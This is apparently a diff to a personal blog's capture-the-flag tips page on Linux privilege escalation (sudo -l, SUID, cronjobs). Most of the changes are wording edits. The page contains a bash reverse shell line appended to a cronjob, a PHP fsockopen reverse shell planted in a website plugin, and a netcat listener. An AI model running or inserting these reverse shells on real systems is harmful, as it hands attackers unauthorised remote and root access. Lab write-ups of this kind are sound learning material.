@@ -10,12 +10,12 @@ permalink: /tipsandtricks/privilegeescalation/
 ---
 
 # Introduction
-Alrighty, so there's a lot that can be said here. I'm unsure how far into this I should go before I lose my mind alongside you reading this, so this might be briefer than it could be. We'll see.
+Alrighty, so there's a lot that can be said here. I'm unsure how far into this I should go before I lose my mind alongside you, so this might be briefer than it could be. We'll see.
 <br><br>
-To better qualify the situation - privilege escalation implies you already have some type of access to a system, say through a basic end user that had a poor password. The following scenarios imply you already have a shell of some kind, and you are looking to further exploit that and get to the point where you are running the shell as an admin / root or at least can execute commands as an admin / root.
+To better qualify the situation - privilege escalation implies you already have some type of access to a system, say through a basic end user that had a poor password. The following scenarios imply you already have a shell of some kind, and you are looking to further exploit that and get to the point where you are running the shell as an admin / root, or at least can execute commands as one.
 <br><br><br>
 # Let's start with sudo -l and SUID permissions
-One of the go to commands once you've established yourself within a shell on a system is a quick `sudo -l`. Takes two seconds to type and another thirty seconds to check if anything from that might be helpful. What that does is list the commands that you can run as sudo, on a properly configured system this should be all but zero for normal users.
+One of the go to commands once you've established yourself within a shell on a system is a quick `sudo -l`. It takes two seconds to type and another thirty seconds to check if anything from those results might be useful. What that does is list the commands that you can run as sudo, on a properly configured system this should be all but zero for normal users.
 <br><br>
 Let's say there is an improperly configured system that allows you to run `/usr/bin/less` with sudo rights. This could lead to you reading files that you should not have access to. The easiest way to discover if there is a way to exploit whatever is listed from the `sudo -l` command is to reference [gtfobins](https://gtfobins.github.io/). They have a _massive_ library of ways to bypass restrictions and escalate your privileges - their site will be referenced multiple times throughout my [CTF Exploits](/blog) page.
 <br><br>
@@ -29,13 +29,13 @@ A great site for this is [pentestmonkey](https://pentestmonkey.net/cheat-sheet/s
 <br><br>
 Back to the reverse shell side of things, let's use the example I mentioned with modifying the file used by the cronjob. Essentially I was able to edit in the following command to a cronjob that executed every minute, and what I appended to that file was the following:<br>
 `bash -i >& /dev/tcp/10.18.91.219/8000 0>&1`<br><br>
-While in another tab I had a netcat listener on that same port:<br>
-`nc -lvnp 8000`<br><br>
+While in another tab I had a netcat listener on that same port: `nc -lvnp 8000`
+<br><br>
 Basically what this two step process is saying is:<br>
-- First, upload a reverse shell somehow, that will somehow be called (examples given here were as activated plugins or a cronjob)
+- First, upload a reverse shell somehow, that will somehow be called (examples given here were as activated plugins or by a cronjob)
 - And then second, you need to be listening on the same port that the reverse shell is trying to reach you at. When that command executes it will try to initiate that connection over port `8000` at my IP address of `10.18.91.219`. If I am not listening over that port I will miss the connection<br><br>
 
-The other example with the plugin I forget exactly how it was worded, but I do recall I was able to gain a foothold into their website editor and from there I could edit their plugins. I edited one of their already active plugins with something like:<br>
+The other example was with the plugin, and although I forget exactly how it was worded, I do recall I was able to gain a foothold into their website editor and from there I could edit their plugins. I edited one of their already active plugins with something like:<br>
 `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`<br><br>
 And then curled the location for that specific php plugin, which started the reverse shell, and my netcat listener was already waiting.<br><br>
 
